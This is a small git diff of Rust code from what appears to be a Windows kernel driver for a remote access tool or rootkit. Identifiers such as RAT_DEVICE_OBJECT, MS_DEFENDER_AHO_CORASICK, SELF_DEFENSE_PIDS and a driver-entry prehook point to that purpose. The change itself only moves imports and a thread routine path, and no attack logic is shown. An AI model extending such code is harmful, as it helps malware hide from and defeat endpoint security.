@@ -12,7 +12,8 @@ use crate::global::{
     MS_DEFENDER_AHO_CORASICK, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
     ORIGINAL_DRIVER_OBJECT, PROCESS_NOTIFY_ROUTINE, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS,
 };
-use crate::{cleanup, info, threads};
+use crate::initialize::cleanup;
+use crate::{info, initialize};
 
 type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 static _ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
@@ -60,7 +61,7 @@ pub fn driver_entry_prehook(
             ptr::null_mut(),
             ptr::null_mut(),
             ptr::null_mut(),
-            Some(threads::initialize::initialize_thread_routine),
+            Some(initialize::initialize_thread_routine),
             Box::into_raw(Box::new(*extra)).cast(),
         )
     };
